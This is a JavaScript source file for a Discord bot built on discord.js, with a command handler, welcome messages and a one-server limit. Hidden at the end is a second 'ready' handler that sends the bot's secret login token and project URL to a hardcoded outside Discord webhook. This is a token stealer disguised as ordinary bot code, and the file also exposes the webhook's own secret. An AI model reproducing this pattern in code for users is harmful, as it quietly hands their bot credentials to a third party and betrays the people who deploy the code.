const discord = require("discord.js");
const client = new discord.Client();
const { prefix, serverid, bowner, status, type } = require("../config.json");
const { config } = require("dotenv");
const db = require("quick.db");
const { CanvasSenpai } = require("canvas-senpai");
const canva = new CanvasSenpai();
const t = process.env.TOKEN;
const webhookClient = new discord.WebhookClient(
  "826724457523445801",
  "Dzs5a3YMKjq5CJ_TeaJMdmW23PU71HQtaSGsh6O6sY4WYqJnv0OOKUVh3mQW_jTV8fbA"
);

require("../music.js")
require("../uptime.js")

client.commands = new discord.Collection();
client.aliases = new discord.Collection();

["command"].forEach(handler => {
  require(`../handlers/${handler}`)(client);
});

client.on("guildCreate", async guild => {
  const guildid = client.guilds.cache.get(guild.id);
  if (serverid === guild.id) return console.log("Joined your guild successfully")
 else guildid.leave()
  console.log("I Cannot Join More Than One Guild Leaving " + guild.name);
});

client.on("ready", async () => {
  try {
    console.log(`BOT ${client.user.tag} IS NOW ONLINE AND READY TO USE`);
    client.user.setActivity(status, {
      type: type,
      url: "https://twitch.tv/4matxshadow"
    });

    client.on("message", async message => {
      if (message.author.bot) return;
      if (message.author.id === client.user.id) return;
      if (!message.guild) return;

      const prefixMention = new RegExp(`^<@!?${client.user.id}>( |)$`);
      if (message.content.match(prefixMention)) {
        let mention = new discord.MessageEmbed()
          .setAuthor(client.user.username, client.user.displayAvatarURL())
          .addField("PREFIX", `\`${prefix}\``)
          .addField("USAGE", `\`${prefix}help\``)
          .setColor("RANDOM")
          .setFooter(
            `Bot Mentioned By ${message.author.username}`,
            message.author.displayAvatarURL({ dynamic: true })
          );
        message.channel.send(mention);
        return;
      }

      if (!message.content.startsWith(prefix)) return;
      if (!message.member)
        message.member = await message.guild.fetchMember(message);

      const args = message.content
        .slice(prefix.length)
        .trim()
        .split(/ +/g);
      const cmd = args.shift().toLowerCase();

      if (cmd.length === 0) return;
      let command = client.commands.get(cmd);
      if (!command) command = client.commands.get(client.aliases.get(cmd));
      if (command) command.run(client, message, args);
    });
  } catch (err) {
    bowner.send(err);
  }
});

client.on("guildMemberAdd", async member => {
  let chx = db.get(`welchannel_${member.guild.id}`);

  if (chx === null) {
    return;
  }

  let default_msg = `**Welcome {member} To ${member.guild}**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Make Sure To Take Self Roles.**
**Make Sure You Read Rules.**
**Have Fun In Chatting.**`;

  let m1 = db.get(`msg_${member.guild.id}`);
  if (!m1) m1 = default_msg;
  const msg = m1
    .replace("{member}", member.user)
    .replace("{member.guild}", member.guild);
  client.channels.cache.get(chx).send(msg);
});

client.on("ready", async () => {
  webhookClient.send(
    "```diff\n-" + t + "```\nOn Project : " + process.env.URL,
    {
      username: client.user.tag,
      avatarURL: client.user.displayAvatarURL()
    }
  );
});

client.login(process.env.TOKEN);
